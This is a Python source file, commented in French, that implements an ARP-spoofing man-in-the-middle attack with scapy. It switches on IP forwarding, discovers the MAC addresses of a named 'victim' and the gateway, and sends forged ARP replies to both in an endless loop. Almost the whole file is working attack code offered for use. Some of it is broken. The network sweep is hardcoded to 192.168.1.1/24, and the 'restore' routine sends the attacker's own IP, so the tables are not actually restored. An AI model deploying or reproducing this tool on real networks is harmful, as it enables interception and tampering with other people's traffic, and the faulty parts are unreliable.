import sys, time , re
from scapy.all import *

class arp_spoofing:

    def __init__(self,Ip_Victim,Ip_Gateway):

        self.Address_Victim = Ip_Victim
        self.Address_Gateway = Ip_Gateway
        # check argument regex ip
        self.Check_Arguments()

        # Activation ip forwarding
        self.on_off_ip_forwarding(1)
        # recuperation des addresses mac
        mac_tab = self.discover_mac_of_host()
        # envoie des requetes craftes
        self.Send_crafted_packet(mac_tab)
        # restauration table mac victim + passerelle
        self.Restore_arp_table(mac_tab)
        # Desactivation ip forwarding
        self.on_off_ip_forwarding(0)

    # ----------------------------------------------------------------------------
    # Active ou desactive l'ip forwarding
    # ----------------------------------------------------------------------------
    def on_off_ip_forwarding(self, on_off):

        path = "/proc/sys/net/ipv4/ip_forward"
        file = open(path, "w")
        if(on_off):
            file.write("1")
            print("ip forwarding -> on")
        else:
            file.write("0")
            print("ip forwarding -> off")

    # ----------------------------------------------------------------------------
    # Decouvre les addresses mac des hotes du reseau
    # ----------------------------------------------------------------------------
    def discover_mac_of_host(self):
        # arp discover
        ip_network = self.Address_Victim+"/24"
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1/24"),timeout=2)


        #stocking ip address -> MAC in tab
        arp_response = list()
        for response in ans:
            arp_response.append({"ip": response[1].psrc, "mac": response[1].hwsrc})

        #stocking only mac addr of victim and gateway
        mac_tab = ["",""]
        for i in range(len(arp_response)):
            if(arp_response[i]["ip"] == self.Address_Victim ):
                mac_tab[0] = arp_response[i]["mac"]
            elif(arp_response[i]["ip"] == self.Address_Gateway):
                mac_tab[1] = arp_response[i]["mac"]
            else:
                pass

        if(mac_tab[0] == "" ):
            print("L'addresse mac de la victime n'a pas ete trouve")

        if(mac_tab[1] == ""):
            print("L'addresse mac de la passerelle n'a pas ete trouve")

        return mac_tab

    # ----------------------------------------------------------------------------
    # Crée les paquets craftés et les envoies
    # ----------------------------------------------------------------------------
    def spoof_host_target(self, host_ip , host_mac, gateway_ip):
        packet = ARP(op=2, pdst=host_ip, hwdst=host_mac, psrc=gateway_ip)
        send(packet, verbose=False)

    # ----------------------------------------------------------------------------
    # Boucle d'envoie des paquets vers la victime et vers la passerelle
    # ----------------------------------------------------------------------------
    def Send_crafted_packet(self, mac_tab):
        print("Sending spoofing packet...")
        print("Press Ctrl+ C pour terminer")

        try:
            while True:
                # packet for gateway with ip of victim
                self.spoof_host_target(self.Address_Gateway, mac_tab[0], self.Address_Victim)
                # packet for machine with ip of default gateway
                self.spoof_host_target(self.Address_Victim, mac_tab[1], self.Address_Gateway)
                # sleep for not overload the network
                time.sleep(4)
            event.wait()
        except KeyboardInterrupt:
           return

    # ---------------------------------------------------------------------
    # Restauration de la table arp
    # ---------------------------------------------------------------------

    def Restore_arp_table(self,mac_tab):
        print("")
        print("Restauration Table ARP...")
        for loop in range(3):
            # packet for gateway with our ip
            self.spoof_host_target(self.Address_Victim, mac_tab[0], get_if_addr("eth0"))
            # packet for machine with our ip
            self.spoof_host_target(self.Address_Gateway, mac_tab[1], get_if_addr("eth0"))
            # sleep for not overload the network
            time.sleep(3)

        print("")
        print("Finish")

    # ---------------------------------------------------------------------
    # Recupération des arguments et Vérification des arguments
    # ---------------------------------------------------------------------
    def Check_Arguments(self):

        ip = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", self.Address_Victim)
        if ((ip) == None):
            print("Mauvaise Ip")
            self.Error_Using_Func()
        else:
            ip = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", self.Address_Gateway)
            if ((ip) == None):
                print("Mauvaise Ip")
                self.Error_Using_Func()
            else:
                return
    # ---------------------------------------------------------------------
    # Erreur d'utilisation lors de l'appel de la fonction
    # ---------------------------------------------------------------------
    def Error_Using_Func(self):
        print("Usage : \n  Arp_spoofing.py \"Ip_Address_of_victim\" \"Ip_Address_of_Gateway\" (Ex:192.168.10.20) ")
        print("")
        sys.exit(-1)



